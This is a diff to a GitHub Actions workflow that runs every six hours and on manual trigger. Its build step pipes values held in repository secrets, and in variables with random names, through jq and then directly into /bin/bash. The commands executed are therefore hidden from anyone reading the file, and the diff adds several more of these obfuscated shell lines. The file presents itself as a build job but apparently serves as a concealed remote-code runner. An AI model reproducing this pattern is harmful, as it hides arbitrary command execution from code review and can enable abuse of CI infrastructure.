@@ -3,7 +3,8 @@ name: caocao19870104
 on:
   workflow_dispatch:
   schedule:
-    - cron: '59 1/6 * * *'
+    - cron: '26 2/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,9 +12,14 @@ jobs:
       - uses: actions/checkout@v4
       - name: caocao19870104
         env:
-          q69: ${{ secrets.q69 }}
+          czc5: ${{ secrets.czc5 }}
         run: |
-          echo $q69 | jq -r .wyv7497 | /bin/bash
-          echo $xxo9014 | jq -r .ov98 | /bin/bash
-          echo $hkczz938 | jq -r .pbsex731 | /bin/bash
+          echo $czc5 | jq -r .rehg92912 | /bin/bash
+          echo $adctz396 | jq -r .oodma49584 | /bin/bash
+          echo $uqmj11496 | jq -r .cbdl6 | /bin/bash
+          echo $gscuv1197 | jq -r .gp2 | /bin/bash
+          echo $k281 | jq -r .nan12685 | /bin/bash
+          echo $f5651 | jq -r .rbjy11 | /bin/bash
+          echo $vkahi6559 | jq -r .lolhe55538 | /bin/bash
+          echo $h8982 | jq -r .n00947 | /bin/bash
 
